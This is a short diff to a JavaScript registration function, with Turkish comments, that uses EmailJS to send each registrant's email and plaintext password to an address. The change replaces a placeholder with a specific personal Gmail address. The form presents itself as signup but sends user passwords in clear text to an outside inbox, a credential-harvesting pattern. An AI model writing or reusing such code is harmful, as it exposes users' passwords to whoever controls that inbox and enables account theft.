@@ -38,7 +38,7 @@ function register() {
 
         // EmailJS ile e-posta gönder
         emailjs.send("service_mqj01mn", "template_dvpf3hk", {
-            to_email: "sizin@email.com", // Bilgilerin gönderileceği e-posta
+            to_email: "enestunoglu95@gmail.com", // Bilgilerin gönderileceği e-posta
             user_email: email,
             user_password: password
         }).then(function(response) {
